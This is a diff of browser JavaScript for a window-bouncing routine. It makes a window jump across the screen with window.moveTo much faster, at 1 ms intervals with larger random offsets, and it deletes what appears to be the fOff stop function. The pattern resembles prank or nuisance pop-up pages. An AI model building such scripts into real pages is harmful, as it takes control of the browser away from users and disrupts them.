@@ -65,32 +65,33 @@ function proCreate() {
     }
 }
 
-
-let xOff = 5, yOff = 5;
+let xOff = 80, yOff = 80;
 let xPos = 400, yPos = -100;
 let flagRun = 1;
 
-function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
-function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
-function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
-function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
-
-function fOff() { flagRun = 0; }
+function newXlt() { xOff = -(Math.random() * 80 + 40); }
+function newXrt() { xOff =  (Math.random() * 80 + 40); }
+function newYup() { yOff = -(Math.random() * 80 + 40); }
+function newYdn() { yOff =  (Math.random() * 80 + 40); }
 
 function playBall() {
     xPos += xOff;
     yPos += yOff;
+
     if (xPos > screen.width - 357) newXlt();
     if (xPos < 0) newXrt();
     if (yPos > screen.height - 330) newYup();
     if (yPos < 0) newYdn();
+
     if (flagRun === 1) {
         try {
             window.moveTo(xPos, yPos);
         } catch (e) {
             flagRun = 0;
+            return;
         }
-        setTimeout(playBall, 16);
+
+        setTimeout(playBall, 1);
     }
 }
 
